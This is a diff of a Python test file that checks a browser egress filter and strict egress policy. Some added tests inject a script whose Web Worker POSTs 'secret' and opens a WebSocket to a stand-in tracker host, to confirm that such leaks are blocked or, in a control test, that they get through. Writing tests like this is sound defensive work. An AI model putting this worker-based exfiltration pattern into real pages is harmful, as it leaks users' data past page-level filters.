@@ -75,7 +75,9 @@ class BrowserEgressTests(unittest.TestCase):
         _Tracker.hits = []
         self.tracker = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _Tracker)
         tracker_url = f"http://tracker.test:{self.tracker.server_address[1]}"
-        page = _page(tracker_url).encode()
+        self.tracker_url = tracker_url
+        self.extra_script = ""
+        test = self
 
         class Chat(http.server.BaseHTTPRequestHandler):
             def log_message(self, *args):
@@ -85,7 +87,7 @@ class BrowserEgressTests(unittest.TestCase):
                 self.send_response(200)
                 self.send_header("Content-Type", "text/html")
                 self.end_headers()
-                self.wfile.write(page)
+                self.wfile.write(_page(tracker_url).replace("</body>", test.extra_script + "</body>").encode())
 
         self.chat = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Chat)
         for server in (self.tracker, self.chat):
@@ -99,6 +101,12 @@ class BrowserEgressTests(unittest.TestCase):
             server.server_close()
 
     def _run(self) -> list[str]:
+        from critique_bot import egress
+
+        if not egress.policy().configured:
+            saved = egress.policy()
+            self.addCleanup(setattr, egress, "_policy", saved)
+            egress.configure("open", self.chat_url)  # the filter on its own, as in "egress": "open"
         browser.set_page_filter(True)  # opt-in: "filter_chat_page": true
         self.addCleanup(browser.set_page_filter, False)
         with patch.object(browser, "EDGE_LAUNCH_ARGS", self.args):
@@ -112,6 +120,34 @@ class BrowserEgressTests(unittest.TestCase):
 
     def test_nothing_reaches_another_host(self) -> None:
         self.assertEqual(self._run(), [])
+
+    def test_strict_egress_stops_workers_too(self) -> None:
+        """Strict egress: even a Web Worker or service worker, which the page filter cannot see, gets nowhere."""
+        from critique_bot import egress
+
+        saved = egress.policy()
+        self.addCleanup(setattr, egress, "_policy", saved)
+        egress.configure("strict", self.chat_url)
+        worker = (
+            f"fetch('{self.tracker_url}/worker-fetch', {{method: 'POST', body: 'secret'}}).catch(() => {{}});"
+            f"try {{ new WebSocket('{self.tracker_url.replace('http', 'ws')}/worker-ws'); }} catch (e) {{}}"
+        )
+        self.extra_script = (
+            "<script>new Worker(URL.createObjectURL(new Blob([" + repr(worker) + "], {type: 'text/javascript'})));</script>"
+        )
+        self.assertEqual(self._run(), [])
+
+    def test_control_workers_leak_without_strict_egress(self) -> None:
+        from critique_bot import egress
+
+        saved = egress.policy()
+        self.addCleanup(setattr, egress, "_policy", saved)
+        egress.configure("open", self.chat_url)
+        worker = f"try {{ new WebSocket('{self.tracker_url.replace('http', 'ws')}/worker-ws'); }} catch (e) {{}}"
+        self.extra_script = (
+            "<script>new Worker(URL.createObjectURL(new Blob([" + repr(worker) + "], {type: 'text/javascript'})));</script>"
+        )
+        self.assertIn("GET /worker-ws (websocket)", self._run())
 
     def test_control_without_the_filter_leaks(self) -> None:
         with patch.object(browser, "guard_page_network", lambda *args, **kwargs: None):
